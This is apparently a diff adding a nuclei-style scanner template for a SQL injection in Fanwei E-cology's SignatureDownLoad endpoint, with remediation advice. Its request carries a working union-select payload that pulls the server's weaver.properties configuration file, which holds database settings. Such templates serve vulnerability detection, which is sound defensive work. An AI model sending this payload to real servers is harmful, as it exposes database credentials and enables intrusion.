@@ -1,0 +1,38 @@
+id: Ecology-sqli-SignatureDownLoad
+info:
+  name: Fanwei E-cology weaver.file.SignatureDownLoad markId Parameter Union-Query Injection
+  author:
+  - 折跃
+  description: |-
+    Fanwei E-cology weaver.file.SignatureDownLoad SQL Injection Vulnerability
+    Fanwei Collaborative Management Application Platform (e-cology) is a large enterprise collaborative management platform that integrates enterprise information portal, knowledge and document management, workflow management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management, and data center capabilities. e-cology can provide a series of general-purpose and industry-specific solutions.
+
+    A SQL injection vulnerability exists in Fanwei E-cology. An attacker can exploit it to execute SQL statements to view, add, modify, or delete information in the database.
+  severity: high
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.weaver.com.cn/
+
+    Temporary remediation:
+    1. Use prepared statements. When using PDO, be careful not to concatenate variables directly into PDO statements. All queries should use the database's parameterized query interface, using parameters instead of embedding user-supplied variables directly into SQL statements. Almost all database systems provide parameterized SQL execution interfaces, which can effectively prevent SQL injection attacks.
+    2. Escape special characters entering the database (such as ', ", <, >, &, *, ;, etc.) or perform encoding conversion.
+    3. Validate the type of each data item; for example, numeric data must be numeric and the corresponding database storage field must be an int type.
+    4. Strictly limit data length, which can, to some extent, prevent longer SQL injection statements from being executed successfully.
+    5. Unify the encoding of every data layer of the website; it is recommended to use UTF-8 encoding throughout, as inconsistent encoding between layers may cause some filtering models to be bypassed.
+    6. Strictly limit the database operational privileges granted to website users, providing only the minimum privileges needed for their work, thereby minimizing the damage injection attacks can cause to the database.
+    7. Avoid displaying SQL error messages on the website, such as type errors and field mismatches, to prevent attackers from leveraging these error messages for reconnaissance.
+    8. Filter dangerous characters; for example, use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate execution if a match is found.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'DriverClasses')
+  path:
+  - '{{BaseURL}}/weaver/weaver.file.SignatureDownLoad?markId=1%20union%20select%20%27..%2fecology%2fWEB-INF%2fprop%2fweaver.properties%27'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
